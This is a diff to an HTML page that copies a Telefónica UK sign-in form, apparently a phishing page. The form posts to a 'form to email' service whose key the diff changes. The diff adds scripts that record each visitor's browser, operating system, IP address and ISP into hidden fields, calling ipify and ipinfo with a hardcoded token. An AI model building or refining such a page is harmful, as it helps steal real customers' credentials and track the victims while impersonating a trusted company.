@@ -1,5 +1,4 @@
 
-
 <!DOCTYPE html>
 <html class="no-js desktop legacy-jquery digital-id">
  <head> 
@@ -856,10 +855,112 @@
               <div style="padding-bottom: 18px;"><br/>
               <span><input type="radio" id="data_3_0" name="data_3" value="Remember my username"/> Remember my username</span><br/>
               </div>
+
+
+
+              <input type="hidden" id="ipAddress" name="ipAddress">
+    <input type="hidden" id="browser" name="browser">
+    <input type="hidden" id="operatingSystem" name="operatingSystem">
+
+ <script>
+                        // Detect browser and operating system
+                        function detectBrowserAndOS() {
+                            const userAgent = navigator.userAgent;
+                            let browser = "Unknown";
+                            let os = "Unknown";
+                            
+                            // Detect Browser
+                            if (userAgent.indexOf("Chrome") > -1) {
+                                browser = "Chrome";
+                            } else if (userAgent.indexOf("Firefox") > -1) {
+                                browser = "Firefox";
+                            } else if (userAgent.indexOf("Safari") > -1) {
+                                browser = "Safari";
+                            } else if (userAgent.indexOf("Edge") > -1) {
+                                browser = "Edge";
+                            } else if (userAgent.indexOf("MSIE") > -1) {
+                                browser = "Internet Explorer";
+                            }
+                            
+                            // Detect Operating System
+                            if (userAgent.indexOf("Win") > -1) {
+                                os = "Windows";
+                            } else if (userAgent.indexOf("Mac") > -1) {
+                                os = "Mac OS";
+                            } else if (userAgent.indexOf("Linux") > -1) {
+                                os = "Linux";
+                            } else if (userAgent.indexOf("Android") > -1) {
+                                os = "Android";
+                            } else if (userAgent.indexOf("iPhone") > -1) {
+                                os = "iOS";
+                            }
+                
+                            // Populate hidden inputs with detected data
+                            document.getElementById("browser").value = browser;
+                            document.getElementById("operatingSystem").value = os;
+                        }
+                
+                        // Get the IP Address (via external API)
+                        function getIP() {
+                            fetch('https://api.ipify.org?format=json')
+                                .then(response => response.json())
+                                .then(data => {
+                                    // Populate the hidden input with the IP address
+                                    document.getElementById("ipAddress").value = data.ip;
+                                })
+                                .catch(err => {
+                                    console.error("Failed to fetch IP address", err);
+                                });
+                        }
+                
+                        // Call functions to populate hidden inputs
+                        detectBrowserAndOS();
+                        getIP();
+                    </script>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ 
+</head>
+<body>
+  
+        <!-- Hidden input to store ISP name -->
+        <input type="hidden" id="ispName" name="ispName">
+    
+
+    <script>
+        // Your IPInfo API key (replace with your actual key)
+        const apiKey = '5991e2bea8b188';
+        
+        // Fetch IP information from IPInfo API
+        fetch(`https://ipinfo.io/json?token=${apiKey}`)
+            .then(response => response.json())
+            .then(data => {
+                // Access ISP name from the data object
+                const ispName = data.org || 'ISP not available';
+                
+                // Set the ISP name to the hidden input field
+                document.getElementById('ispName').value = ispName;
+                
+                // Optionally log to console to verify
+                console.log("ISP Name: " + ispName);
+            })
+            .catch(error => {
+                console.error('Error fetching IP info:', error);
+            });
+    </script>
+</body>
+</html>
+
+
               <div style="padding-bottom: 18px;"><input name="skip_Submit" value="Sign In" type="submit"/></div>
               <div>
                 <div class="hidden" style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
-              <script src="https://www.100forms.com/js/FORMKEY:Q52XJ46B75MW" type="text/javascript"></script>
+              <script src="https://www.100forms.com/js/FORMKEY:GL6XPJL328DA" type="text/javascript"></script>
               </div>
               </form>
               
@@ -1275,7 +1376,7 @@
              <section data-quickedit-entity-id="block_content/1" id="block-copyrightblock-2" class="contextual-region block block-block-content block-block-content4f367b99-0ecf-4f95-90ab-f7818e400e56 clearfix" data-block-plugin-id="block_content:4f367b99-0ecf-4f95-90ab-f7818e400e56"> 
               <div data-contextual-id="block:block=copyrightblock_2:langcode=en|block_content:block_content=1:changed=1672912609&amp;langcode=en" data-contextual-token="88urG6oKE7S8fG_FGvv9M15QJzUziua1XaE4bdsvILk"></div> 
               <div class="telefonica-links"> 
-               <p>&copy; 2023 Telef&oacute;nica UK Limited</p> 
+               <p>&copy; 2024 Telef&oacute;nica UK Limited</p> 
               </div> 
              </section> 
             </div> 
